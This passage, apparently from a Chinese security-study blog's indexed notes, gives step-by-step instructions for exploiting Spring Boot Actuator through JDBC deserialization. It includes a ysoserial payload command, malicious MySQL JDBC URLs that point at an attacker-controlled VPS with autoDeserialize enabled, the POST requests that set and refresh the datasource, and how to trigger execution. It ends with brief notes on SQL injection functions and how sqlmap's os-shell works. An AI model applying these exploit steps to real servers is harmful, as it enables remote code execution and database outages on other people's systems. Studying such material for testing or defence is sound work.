+<p>搜索并观察环境变量中是否存在常见的反序列化 gadget 依赖，比如 <code>commons-collections</code>、<code>Jdk7u21</code>、<code>Jdk8u20</code> 等；</p>
+<p>搜索 <code>spring.datasource.url</code> 关键词，记录下其 <code>value</code> 值，方便后续恢复其正常 jdbc url 值。</p>
+<p>2、架设恶意 rogue mysql server</p>
+<p>在自己控制的服务器上运行 <a href="https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/codebase/springboot-jdbc-deserialization-rce.py">springboot-jdbc-deserialization-rce.py</a> 脚本，并使用 <a href="https://github.com/frohoff/ysoserial">ysoserial</a> 自定义要执行的命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -jar ysoserial.jar CommonsCollections3 calc &gt; payload.ser</span><br></pre></td></tr></table></figure>
+
+<p>在脚本<strong>同目录下</strong>生成 <code>payload.ser</code> 反序列化 payload 文件，供脚本使用。</p>
+<p>3、设置 spring.datasource.url 属性</p>
+<blockquote>
+<p>   修改此属性会暂时导致网站所有的正常数据库服务不可用，会对业务造成影响，请谨慎操作！</p>
+</blockquote>
+<p>mysql-connector-java 5.x 版本设置<strong>属性值</strong>为：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">jdbc:mysql://your-vps-ip:3306/mysql?characterEncoding=utf8&amp;useSSL=false&amp;statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&amp;autoDeserialize=true</span><br></pre></td></tr></table></figure>
+
+<p>mysql-connector-java 8.x 版本设置<strong>属性值</strong>为：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">jdbc:mysql://your-vps-ip:3306/mysql?characterEncoding=utf8&amp;useSSL=false&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;autoDeserialize=true</span><br></pre></td></tr></table></figure>
+
+<p>spring 1.x</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /env</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">spring.datasource.url=对应属性值</span><br></pre></td></tr></table></figure>
+
+<p>spring 2.x</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /actuator/env</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;&quot;name&quot;:&quot;spring.datasource.url&quot;,&quot;value&quot;:&quot;对应属性值&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>4、刷新配置</p>
+<p>spring 1.x</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /refresh</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br></pre></td></tr></table></figure>
+
+<p>spring 2.x</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /actuator/refresh</span><br><span class="line">Content-Type: application/json</span><br></pre></td></tr></table></figure>
+
+<p>5、触发数据库查询</p>
+<p>尝试访问网站已知的数据库查询的接口，例如： <code>/product/list</code> ，或者寻找其他方式，主动触发源网站进行数据库查询，然后漏洞会被触发</p>
+<p>6、恢复正常 jdbc url</p>
+<p>反序列化漏洞利用完成后，使用 <strong>步骤三</strong> 的方法恢复 <strong>步骤一</strong> 中记录的 <code>spring.datasource.url</code> 的原始 <code>value</code> 值</p>
+<h3 id="restart-logging-config-logback-JNDI-RCE"><a href="#restart-logging-config-logback-JNDI-RCE" class="headerlink" title="restart logging.config logback JNDI RCE"></a>restart logging.config logback JNDI RCE</h3><h3 id="restart-logging-config-groovy-RCE"><a href="#restart-logging-config-groovy-RCE" class="headerlink" title="restart logging.config groovy RCE"></a>restart logging.config groovy RCE</h3><h3 id="restart-spring-main-sources-groovy-RCE"><a href="#restart-spring-main-sources-groovy-RCE" class="headerlink" title="restart spring.main.sources groovy RCE"></a>restart spring.main.sources groovy RCE</h3><h3 id="restart-spring-datasource-data-h2-database-RCE"><a href="#restart-spring-datasource-data-h2-database-RCE" class="headerlink" title="restart spring.datasource.data h2 database RCE"></a>restart spring.datasource.data h2 database RCE</h3><h2 id="那些漏洞通常被用来打点"><a href="#那些漏洞通常被用来打点" class="headerlink" title="那些漏洞通常被用来打点"></a>那些漏洞通常被用来打点</h2><p>log4j、fastjson、apache shiro、上传漏洞、弱口令</p>
+<h2 id="常用的sql注入函数"><a href="#常用的sql注入函数" class="headerlink" title="常用的sql注入函数"></a>常用的sql注入函数</h2><h3 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h3><p>concat()、group_concat()</p>
+<h3 id="报错函数"><a href="#报错函数" class="headerlink" title="报错函数"></a>报错函数</h3><p>updatexml()、extractvalue()、floor()、exp()</p>
+<h3 id="延时注入函数"><a href="#延时注入函数" class="headerlink" title="延时注入函数"></a>延时注入函数</h3><p>sleep()</p>
+<h3 id="盲注函数"><a href="#盲注函数" class="headerlink" title="盲注函数"></a>盲注函数</h3><p>char()、sub()、mid()、ascii()、length()、substr()、count()</p>
+<h2 id="sqlmap-–os-shell-参数的原理"><a href="#sqlmap-–os-shell-参数的原理" class="headerlink" title="sqlmap –os-shell 参数的原理"></a>sqlmap –os-shell 参数的原理</h2><p>当数据库为 mysql postgresql时，sqlmap上传一个二进制库，包含用户自定义的命令执行函数，</p>
+<p>对于 sql server 数据库，sqlmap会使用 xp_cmdshell 存储过程，</p>
+<p>本质是通过sqlmap上传一个shell，然后通过shell来进行命令执行。</p>
+]]></content>
   </entry>
 </search>
